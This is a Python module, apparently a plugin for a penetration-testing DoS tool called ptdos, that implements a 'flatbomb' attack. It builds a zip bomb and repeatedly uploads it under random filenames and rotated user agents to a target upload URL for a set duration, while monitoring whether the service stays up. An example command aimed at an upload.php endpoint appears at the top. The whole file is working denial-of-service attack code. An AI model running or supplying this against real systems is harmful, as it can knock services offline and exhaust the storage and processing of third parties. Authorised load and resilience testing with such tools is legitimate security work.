"""ptdos extension that adds a flatbomb attack"""
#python3 ptdos.py -a flatbomb -ks 1 -c 5 -dst http://192.168.0.80/upload.php -o mini.zip

# own libs
from infrastructure import factory
from misc.pt_zip import build_flat_bomb
from monitoring.ptcheckservice import print_error, attack_append_out_data, attack_checkservice_review
from misc.pt_http import post_file_upload
from misc.globalfuncs import load_user_agents, parse_url
# external libs
from dataclasses import dataclass
from ptlibs.ptprinthelper import ptprint,out_ifnot
from time import time, asctime, sleep
from random import randbytes


@dataclass
class FlatBomb:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""

        copies = args["copies"]
        k_size = args["kernel-size"]
        output = args["output"]

        ptprint(out_ifnot(f"Begining construction, expected size: {k_size*copies} MB", "INFO", use_json))

        try:
            bomb = build_flat_bomb(copies,k_size)
        except ValueError as e:
            ptprint(out_ifnot(f"When building Flat Bomb error has occured: {e}", "ERROR", use_json))
            return

        if(output != ""):
            with open(output,"wb") as zip:
                zip.write(bomb)
                ptprint(out_ifnot(f"Saved payload locally to {output}", "INFO", use_json))
        
        if "127.0.0.1" in dst or "localhost" in dst:
            ptprint(out_ifnot("Local mode detected. Skipping HTTP delivery.", "INFO", use_json))
            return

        my_user_agents, my_accept_lang = load_user_agents()

        att_start_t_epoch = time() #workaround since building zipbombs obviously takes time
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)
        ctx = 0
        try:
            while True:
                if time() - att_start_t_epoch >= duration:
                    monitoringprocess()
                    sleep(1)
                    att_end_t_asc = asctime()
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break
                
                if post_file_upload(dst, str(randbytes(8).hex()) + ".zip", bomb, my_user_agents, my_accept_lang):
                    ctx += 1


        except BaseException as err:
            monitoringprocess()
            return print_error(json_obj, use_json, json_no, self.name, str(err))

        attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, ctx)
        monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

        return

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"Flat Bomb attack options": [
                ["-a", "--attack", "<attack>", "Attack name - flatbomb"],
                ["-ks", "--kernel-size", "<kernel-size>", "Size of the uncompressed kernel MB"],
                ["-c", "--copies", "<copies>", "Ammount of kernel copies in the flatbomb"],
                ["-dst", "--destination", "<dst>", "Specify destination URL."],
                ["-o", "--output", "<output>", "Specify output for saving zip-bomb locally"]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""
        parser.add_argument("-ks", "--kernel-size", dest="kernel-size", type=int, default=10) 

def register() -> None:
    """Register attack in factory."""
    factory.register("flatbomb", FlatBomb)